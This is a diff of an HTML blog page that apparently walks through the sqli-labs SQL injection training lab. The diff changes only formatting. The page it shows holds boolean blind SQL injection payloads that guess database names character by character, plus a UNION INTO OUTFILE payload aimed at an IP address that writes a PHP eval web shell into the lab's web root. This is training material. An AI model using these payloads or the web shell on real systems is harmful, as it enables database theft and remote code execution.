@@ -468,10 +468,13 @@
 <p>less8</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; and (length(database())&#x3D;8)--+ ;</span><br><span class="line"># 猜数据库长度</span><br><span class="line">id&#x3D;1&#39; and (ascii(substr(database(),1,1))&gt;97)--+;</span><br><span class="line"># 猜数据库ascii 值</span><br></pre></td></tr></table></figure>
 
+
+
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>)<span class="comment">--+ 正常</span></span><br><span class="line">http://180.21.14.254:8080/Less-7/?id=1')) union select 1,2,'&lt;?php @eval($_POST[CMD]);?&gt;' into outfile "C://phpstudy_pro//WWW//sqli-labs//Less-7//huang.php"--+</span><br></pre></td></tr></table></figure>
-<pre><code>
-一句话传参密码
-</code></pre>
+
+
+
+<h3 id="一句话传参密码"><a href="#一句话传参密码" class="headerlink" title="一句话传参密码"></a>一句话传参密码</h3>
                 
             </div>
             <hr/>
